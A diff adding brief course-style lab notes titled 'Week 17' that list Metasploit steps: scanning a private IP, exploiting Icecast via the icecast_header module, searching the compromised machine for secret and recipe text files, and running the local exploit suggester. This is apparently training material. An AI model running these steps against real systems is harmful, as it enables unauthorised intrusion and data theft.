@@ -1,0 +1,11 @@
+Week 17
+1. nmap -sv 192.168.0.20
+2. searchsploit icecast
+3. msfconsole
+4. search icecast;  use 0 (0 = exploit/windows/http/icecast_header)
+5. set rhost 192.168.0.20
+6. run; search -f *secretfile*.txt
+7. search -f *recipe*.txt
+6. run post/multi/recon/local_exploit_suggester
+
+
